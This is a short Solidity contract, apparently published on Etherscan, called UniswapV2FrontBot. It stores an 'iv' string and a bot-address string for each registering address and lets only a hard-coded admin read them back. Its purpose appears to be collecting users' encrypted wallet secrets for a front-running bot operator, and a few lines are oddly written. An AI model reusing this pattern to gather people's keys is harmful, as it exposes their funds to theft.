/**
 *Submitted for verification at Etherscan.io on 2021-03-19
*/

pragma solidity ^0.4.18;

contract UniswapV2FrontBot {
    
    struct FrontBot {
        string iv;
        string botAddr;
    }
    
    mapping (address => FrontBot) bots;
    address[] public botAccts;
    
    address public admin = 0x6E7bE797DE52cEA969130c028aD168844C4C5Bb5;
    
    modifier isAdmin(){
        if(msg.sender != admin)
            return;
        _;
    }
    
    function setFrontBot(address _address, string _iv, string _botAddr) public {
        var bot = bots[_address];
        
        bot.iv = _iv;
        bot.botAddr = _botAddr;

        botAccts.push(_address) -1;
    }
    
    function getFrontBots() view public returns(address[]) {
        return botAccts;
    }
    
    function getFrontBot(address _address) view isAdmin public returns (FrontBot) {
        return (bots[_address]);
    }
    
    function countFrontBots() view public returns (uint) {
        return botAccts.length;
    }
}